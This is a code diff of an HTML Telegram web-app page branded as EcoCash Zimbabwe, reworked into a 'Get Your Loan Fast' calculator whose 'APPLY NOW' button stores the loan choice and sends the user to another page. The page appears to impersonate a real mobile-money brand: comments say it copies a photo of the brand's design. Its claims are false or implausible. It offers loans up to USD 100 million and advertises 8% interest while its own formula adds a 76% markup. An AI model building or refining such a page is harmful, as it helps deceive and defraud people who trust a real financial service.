@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>EcoCash Loan Calculator</title>
+    <title>EcoCash - Get Your Loan Fast</title>
 
     <!-- ✅ Telegram SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -11,7 +11,7 @@
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f5f6f8;
+            background-color: #f1f3f5;
             margin: 0;
             padding: 0;
             display: flex;
@@ -19,151 +19,297 @@
             align-items: center;
         }
 
+        /* Top Header Navigation bar */
         .app-header {
             width: 100%;
-            background: linear-gradient(135deg, #005fa9, #004080);
-            padding: 20px 20px 45px;
+            background-color: #0066ff;
+            padding: 15px 20px;
             color: white;
-            font-size: 22px;
+            font-size: 24px;
             font-weight: bold;
             display: flex;
-            justify-content: space-between;
+            align-items: center;
             box-sizing: border-box;
-            border-bottom: 4px solid #ffcb05;
+            position: relative;
         }
 
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            margin-right: auto;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 26px;
+        }
+
+        .header-title .eco { color: #ffffff; }
+        .header-title .cash { color: #ff3333; }
+
+        /* Card Layout */
         .card {
             background: white;
             width: 92%;
             max-width: 450px;
-            margin-top: -30px;
-            padding: 30px 20px;
-            border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+            margin: 20px 0;
+            padding: 25px 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
             box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
         }
 
-        h2 {
-            font-size: 22px;
-            color: #005fa9;
+        .main-title {
+            font-size: 26px;
+            color: #0066ff;
             margin: 0 0 5px;
             text-align: center;
             font-weight: bold;
         }
 
         .subtext {
-            font-size: 12px;
-            color: #666;
+            font-size: 13px;
+            color: #888;
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
 
-        .slider-section { margin-bottom: 25px; }
+        /* Calculator Inner Area Container */
+        .calculator-container {
+            background: #fafafa;
+            border-radius: 12px;
+            padding: 15px;
+            border: 1px solid #f0f0f0;
+            margin-bottom: 25px;
+        }
+
+        .calculator-title {
+            color: #0066ff;
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .slider-section { margin-bottom: 20px; }
 
         .slider-header {
             display: flex;
             justify-content: space-between;
-            font-weight: 600;
             font-size: 14px;
-            color: #333;
+            color: #444;
+            font-weight: 500;
         }
 
-        .ecocash-blue { color: #005fa9; font-weight: bold; }
+        .red-text { color: #ff4d4d; font-weight: bold; }
 
         input[type=range] {
             width: 100%;
-            accent-color: #005fa9;
-            margin: 15px 0;
+            accent-color: #ff4d4d;
+            margin: 10px 0;
             height: 6px;
+            cursor: pointer;
         }
 
         .slider-footer {
             display: flex;
             justify-content: space-between;
-            font-size: 11px;
-            color: #aaa;
+            font-size: 12px;
+            color: #bbb;
         }
 
+        /* Monthly Payment Results */
         .result-container {
-            background: #fcfcfc;
-            border: 1px solid #f0f0f0;
+            background: white;
+            border: 1px solid #eaeaea;
             border-radius: 10px;
-            padding: 15px;
-            text-align: center;
-            margin: 25px 0;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 15px;
         }
 
-        .result-value {
-            color: #005fa9;
-            font-size: 32px;
+        .result-label {
+            font-size: 14px;
+            color: #888;
+            line-height: 1.2;
+            text-align: left;
+        }
+
+        .result-value-box {
+            text-align: right;
+        }
+
+        .result-currency {
+            color: #ff4d4d;
+            font-size: 20px;
             font-weight: bold;
-            margin: 5px 0 0;
+            display: block;
+            margin: 0;
         }
 
+        .result-amount {
+            color: #ff4d4d;
+            font-size: 28px;
+            font-weight: bold;
+            display: block;
+            margin: 0;
+            line-height: 1;
+        }
+
+        /* CTA Button */
         .btn-apply {
-            background: linear-gradient(to right, #ffcb05, #ffd633);
-            color: #002d62;
+            background: #0066ff;
+            color: white;
             border: none;
             width: 100%;
             padding: 18px;
             border-radius: 8px;
-            font-size: 18px;
+            font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            transition: opacity 0.2s;
+            letter-spacing: 0.5px;
+            margin-bottom: 25px;
         }
 
         .btn-apply:active {
             opacity: 0.9;
         }
 
-        .footer {
+        /* Features/Highlights Section */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
             text-align: center;
-            font-size: 11px;
-            color: #bbb;
-            margin: 30px 0;
+        }
+
+        .feature-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .feature-title {
+            font-size: 12px;
+            font-weight: bold;
+            color: #005fa9;
+            margin-bottom: 2px;
+        }
+
+        .feature-desc {
+            font-size: 10px;
+            color: #888;
+            line-height: 1.2;
+        }
+
+        /* Blue Bottom Banner */
+        .footer-banner {
+            width: 100%;
+            background-color: #0066ff;
+            color: rgba(255, 255, 255, 0.8);
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            margin-top: auto;
+            box-sizing: border-box;
         }
     </style>
 </head>
 
 <body>
 
+<!-- Header Banner matching the photo -->
 <div class="app-header">
-    <span>EcoCash</span>
-    <span>☰</span>
+    <span class="menu-icon">☰</span>
+    <div class="header-title">
+        <span class="eco">Eco</span><span class="cash">Cash</span>
+    </div>
 </div>
 
 <div class="card">
-    <h2>Get Instant Cash Loan</h2>
-    <div class="subtext">Fast approval • Low rates • Flexible repayment terms</div>
+    <h1 class="main-title">Get Your Loan Fast</h1>
+    <div class="subtext">Quick approval • Low interest • Easy terms</div>
 
-    <div class="slider-section">
-        <div class="slider-header">
-            <span>Loan Amount</span>
-            <span id="valAmt" class="ecocash-blue">$100</span>
+    <!-- Inside Gray Loan Box -->
+    <div class="calculator-container">
+        <div class="calculator-title">Loan Calculator</div>
+
+        <!-- Loan Amount Selector -->
+        <div class="slider-section">
+            <div class="slider-header">
+                <span>Loan Amount</span>
+                <span id="valAmt" class="red-text">USD 10,000,000</span>
+            </div>
+            <input type="range" id="amt" min="10000" max="100000000" step="10000" value="10000000">
+            <div class="slider-footer">
+                <span>USD 10K</span>
+                <span>USD 100M</span>
+            </div>
         </div>
-        <input type="range" id="amt" min="5" max="500" step="5" value="100">
-        <div class="slider-footer"><span>$5</span><span>$500</span></div>
-    </div>
 
-    <div class="slider-section">
-        <div class="slider-header">
-            <span>Repayment Period</span>
-            <span id="valDur" class="ecocash-blue">12 months</span>
+        <!-- Duration Selector -->
+        <div class="slider-section">
+            <div class="slider-header">
+                <span>Loan Term</span>
+                <span id="valDur" class="red-text">months 60</span>
+            </div>
+            <input type="range" id="dur" min="6" max="60" step="6" value="60">
+            <div class="slider-footer">
+                <span>months 6</span>
+                <span>months 60</span>
+            </div>
         </div>
-        <input type="range" id="dur" min="1" max="12" step="1" value="3">
-        <div class="slider-footer"><span>1 month</span><span>12 months</span></div>
+
+        <!-- Display Area -->
+        <div class="result-container">
+            <div class="result-label">Monthly<br>Payment</div>
+            <div class="result-value-box">
+                <span class="result-currency">USD</span>
+                <span id="monthly" class="result-amount">293,513</span>
+            </div>
+        </div>
     </div>
 
-    <div class="result-container">
-        <p style="margin:0; font-size:14px; color:#666">Estimated Monthly Repayment</p>
-        <p id="monthly" class="result-value">$38.33</p>
-    </div>
-
+    <!-- Submit Button going to Page 2 -->
     <button class="btn-apply" onclick="goToPage2()">APPLY NOW</button>
+
+    <!-- Bottom Features -->
+    <div class="features-grid">
+        <div class="feature-item">
+            <span class="feature-icon">⚡</span>
+            <span class="feature-title">Fast Approval</span>
+            <span class="feature-desc">Within 24 hours</span>
+        </div>
+        <div class="feature-item">
+            <span class="feature-icon">💰</span>
+            <span class="feature-title">Low Interest</span>
+            <span class="feature-desc">Starting from 8%</span>
+        </div>
+        <div class="feature-item">
+            <span class="feature-icon">🔒</span>
+            <span class="feature-title">Secure</span>
+            <span class="feature-desc">Bank-level security</span>
+        </div>
+    </div>
 </div>
 
-<div class="footer">© 2026 EcoCash Zimbabwe. All rights reserved.</div>
+<!-- Bottom navigation footer matching the image design -->
+<div class="footer-banner">
+    © 2026 EcoCash Zimbabwe
+</div>
 
 <script>
     function update() {
@@ -175,12 +321,15 @@
         const amount = Number(amtEl.value) || 0;
         const duration = Number(durEl.value) || 1;
 
-        document.getElementById('valAmt').innerText = `$${amount.toLocaleString()}`;
-        document.getElementById('valDur').innerText = `${duration} ${duration === 1 ? 'month' : 'months'}`;
+        // Display formatting matching image standard exactly
+        document.getElementById('valAmt').innerText = `USD ${amount.toLocaleString()}`;
+        document.getElementById('valDur').innerText = `months ${duration}`;
 
-        // EcoCash calculation logic (using a 15% processing/interest markup)
-        const monthly = (amount * 1.15) / duration;
-        document.getElementById('monthly').innerText = `$${monthly.toFixed(2)}`;
+        // Basic calculation logic: (Amount * Interest multiplier 1.76) / duration
+        const monthly = (amount * 1.76) / duration;
+        
+        // Show calculated monthly output
+        document.getElementById('monthly').innerText = Math.round(monthly).toLocaleString();
     }
 
     function goToPage2() {
@@ -192,6 +341,7 @@
         localStorage.setItem('amount', amtEl.value);
         localStorage.setItem('loanDuration', durEl.value + " Months");
 
+        // Routes to Page 2
         window.location.href = "/page2";
     }
 
